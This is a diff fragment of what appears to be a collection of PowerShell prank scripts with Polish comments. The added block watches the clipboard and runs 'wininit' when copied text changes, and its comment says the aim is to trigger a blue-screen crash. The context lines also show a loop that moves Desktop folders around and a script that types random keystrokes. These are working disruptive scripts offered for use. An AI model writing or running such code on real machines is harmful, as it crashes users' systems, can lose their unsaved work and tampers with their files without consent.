@@ -160,3 +160,21 @@ $directories = (gci "$home\Desktop" -r -di).FullName;for(){mi (gci "$home\Deskto
 
 #skrypt wypisujący 6 losowych znaków
 [System.Windows.Forms.SendKeys]::SendWait(([char[]] ([int][char]'a'..[int][char]'z' + [int][char]'A'..[int][char]'Z' + [int][char]'0'..[int][char]'9' + [int][char]'ą'..[int][char]'ż') | Get-Random -c 6))
+
+#ten program robi BSOD kiedy użytkownik skopiuje tekst
+$previousClipboardContent = Get-Clipboard -Format Text
+while ($previousClipboardContent -eq (Get-Clipboard -Format Text)){
+    
+}
+
+while (1) {
+    $currentClipboardContent = Get-Clipboard -Format Text
+
+    if ($currentClipboardContent -ne $previousClipboardContent) {
+        wininit
+
+        $previousClipboardContent = $currentClipboardContent
+    }
+
+    Start-Sleep -Seconds 1
+}
